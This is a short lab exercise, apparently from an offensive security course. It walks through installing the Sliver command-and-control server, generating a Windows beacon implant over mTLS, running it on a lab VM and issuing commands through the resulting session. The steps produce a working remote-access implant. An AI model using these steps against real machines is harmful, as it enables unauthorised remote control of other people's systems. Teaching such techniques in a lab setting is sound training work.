# Lab 1: Setting Up a Sliver Server

## Goal: Launch a C2 server and generate a beacon.

## Steps:
1. **Install Sliver**: Follow the official installation guide on your Kali machine.
2. **Start Server**: Run `sliver-server`.
3. **Generate Beacon**: 
   `generate --mtls <your_ip> --os windows`
4. **Start Listener**: 
   `mtls` (Tells Sliver to wait for connections).
5. **Execute**: Run the generated `.exe` on your Windows VM.
6. **Interact**: In the Sliver console, you will see the session. Type `sessions` and then `use <session_id>`.

## Success Check:
- [ ] Successfully established a session.
- [ ] Can run commands (e.g., `ls`, `whoami`) through the C2.
- [ ] Understand how "Beaconing" differs from a constant connection.
